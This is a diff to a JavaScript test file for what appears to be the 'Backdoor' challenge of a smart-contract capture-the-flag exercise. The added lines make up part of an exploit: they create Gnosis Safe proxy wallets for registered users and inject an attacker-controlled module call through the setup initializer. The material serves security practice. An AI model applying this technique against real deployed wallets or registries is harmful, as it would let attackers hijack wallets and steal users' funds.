@@ -80,6 +80,28 @@ describe("[Challenge] Backdoor", function () {
     abi2 = [`function enableModule2(address module)`];
     iface2 = new ethers.utils.Interface(abi2);
     data = iface2.encodeFunctionData("enableModule2", [backdoor.address]);
+    for (i = 0; i < users.length; i++) {
+      initializer = iface1.encodeFunctionData("setup", [
+        [users[i]],
+        1,
+        fakeMaster.address,
+        ethers.utils.arrayify(data),
+        ethers.constants.AddressZero,
+        ethers.constants.AddressZero,
+        0,
+        ethers.constants.AddressZero,
+      ]);
+      await walletFactory.createProxyWithCallback(
+        masterCopy.address,
+        initializer,
+        0,
+        walletRegistry.address
+      );
+      newWallet = await walletRegistry.wallets(users[i]);
+      newWallets.push(newWallet);
+      console.log(`new wallet for user ${users[i]} is at ${newWallets[i]}`);
+      expect(await token.balanceOf(newWallets[i])).to.eq(10n * 10n ** 18n);
+    }
   });
 
   after(async function () {
